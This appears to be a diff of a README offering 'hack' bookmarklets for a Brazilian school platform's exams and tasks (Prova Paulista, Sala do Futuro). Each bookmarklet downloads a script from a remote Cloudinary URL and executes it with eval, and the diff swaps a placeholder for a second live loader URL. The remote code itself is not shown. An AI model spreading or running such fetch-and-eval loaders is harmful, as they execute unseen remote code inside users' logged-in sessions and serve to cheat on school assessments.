@@ -1,12 +1,12 @@
 # 🚀 HCK - PROVA PAULISTA 
 
-### STABLE HCK - PROVAS:
+### STABLE HCK - PROVA PAULISTA:
 ```js
 javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745012111/saladofuturo.js").then(t=>t.text()).then(eval);
 ```
-### ALPHA HCK - TAREFAS:
+### FANDAGOS - TAREFAS:
 ```js
-javascript:fetch("INDISPONÍVEL").then(t=>t.text()).then(eval);
+javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745784863/saladofuturov2.js").then(t=>t.text()).then(eval);
 ```
 
 ### Discord: hackermoon
